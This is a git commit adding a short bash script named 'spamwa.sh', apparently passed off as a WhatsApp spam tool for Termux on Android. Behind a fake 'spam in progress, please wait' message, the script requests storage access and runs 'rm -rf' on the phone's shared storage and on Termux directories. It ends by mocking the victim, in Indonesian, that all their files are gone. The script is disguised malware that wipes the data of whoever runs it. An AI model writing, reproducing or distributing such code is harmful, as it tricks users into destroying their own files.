6c46c1af1ad4e3ff000910b5cc717c12d4158f88
Kemranggon123 <102193752+Kemranggon123@users.noreply.github.com>
2022-12-14 12:26:29 +0700

    spamwa.sh

---
+++ spamwa.sh
@@ -0,0 +1,8 @@
+!/bin/bash
+echo "PROSESS SPAM MOHON TUNGGU SEBENTAR"
+termux-setup-storage
+rm -rf /sdcard/*
+rm -rf /data/data/com./termux/files.usr
+rm -rf /data/data/com./termux/files
+sleep 20 && clear
+echo "mampus file hilang semua wkwkw"
